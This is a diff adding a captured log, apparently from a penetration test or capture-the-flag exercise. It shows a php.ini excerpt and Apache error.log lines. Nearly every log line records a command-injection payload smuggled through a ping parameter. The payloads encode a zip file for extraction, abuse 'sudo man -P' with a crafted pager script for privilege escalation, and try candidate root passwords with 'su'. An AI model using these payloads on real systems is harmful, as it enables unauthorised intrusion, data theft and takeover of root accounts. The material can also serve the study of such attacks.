@@ -1,0 +1,23 @@
+=== php.ini restrictions (read from host config) ===
+323:disable_functions = 
+508:display_errors = Off
+527:log_errors = On
+=== apache error.log tail (does ping stderr land here?) ===
+total 80
+drwxr-x--- 1 root adm   4096 Apr  5  2025 .
+drwxr-xr-x 1 root root  4096 Apr  5  2025 ..
+-rw-r----- 1 root adm  44895 Oct  1 16:42 access.log
+-rw-r----- 1 root adm  15853 Oct  1 16:42 error.log
+-rw-r----- 1 root adm      0 Apr  5  2025 other_vhosts_access.log
+ping: w\h\o\a\m\i;cat /tmp/r73.out: Name or service not known
+ping: w\h\o\a\m\i;sh -c base64\ /tmp/s.zip\ \>\ /tmp/s.b64\;\ chmod\ 644\ /tmp/s.b64\;\ cat\ /tmp/s.b64 > /tmp/r73.out 2>&1: Name or service not known
+ping: w\h\o\a\m\i;cat /tmp/r73.out: Name or service not known
+ping: w\h\o\a\m\i;sh -c for\ pw\ in\ \"secretitosecretazo\!\"\ \"SuperSecret123\!\"\ \"chocolate\"\;\ do\ printf\ \"#\!/bin/sh\\n/bin/sh\ /tmp/cmd.txt\ \>\ /tmp/bal4.out\ 2\>\&1\\n\"\ \>\ /tmp/run4.sh\;\ chmod\ 755\ /tmp/run4.sh\;\ printf\ \"printf\ %s\\\\\\\\n\ \\x27%s\\x27\ \|\ script\ -qec\ \\\"su\ -c\ id\ root\\\"\ /dev/null\\n\"\ \"\"\ \"\$pw\"\ \>\ /tmp/cmd.txt\;\ chmod\ 644\ /tmp/cmd.txt\;\ rm\ -f\ /tmp/bal4.out\;\ script\ -qec\ \"sudo\ -u\ balutin\ /usr/bin/man\ -P\ /tmp/run4.sh\ ls\"\ /dev/null\ \>/dev/null\ 2\>\&1\;\ echo\ \"---\ candidate:\ \$pw\ ---\"\;\ cat\ /tmp/bal4.out\ 2\>\&1\ \|\ head\ -6\;\ done > /tmp/r73.out 2>&1: Name or service not known
+ping: w\h\o\a\m\i;sh -c echo\ TREE1\ \|\ sed\ \"s#\^#A#\"\ \;\ echo\ done > /tmp/r73.out 2>&1: Name or service not known
+ping: w\h\o\a\m\i;cat /tmp/r73.out: Name or service not known
+ping: w\h\o\a\m\i;sh -c $'cat > /tmp/cmd.txt <<"ZZEOF"\nprintf "%s\\n" "secretitosecretazo!" | timeout 10 script -qec "su -c id root" /dev/null\nZZEOF\nchmod 644 /tmp/cmd.txt\necho "--- cmd.txt content ---"\ncat /tmp/cmd.txt' > /tmp/r73.out 2>&1: Name or service not known
+ping: w\h\o\a\m\i;cat /tmp/r73.out: Name or service not known
+ping: w\h\o\a\m\i;printf "%s\n" "secretitosecretazo!" | timeout 10 script -qec "su -c id root" /dev/null 2>&1 | tail -5 > /tmp/r73.out 2>&1: Name or service not known
+ping: w\h\o\a\m\i;cat /tmp/r73.out: Name or service not known
+ping: w\h\o\a\m\i;for pw in "SuperSecret123!" "chocolate"; do echo "--- candidate: $pw ---"; printf "%s\n" "$pw" | timeout 10 script -qec "su -c id root" /dev/null 2>&1 | grep -vE "^Password:" | tail -4; done > /tmp/r73.out 2>&1: Name or service not known
+ping: w\h\o\a\m\i;cat /tmp/r73.out: Name or service not known
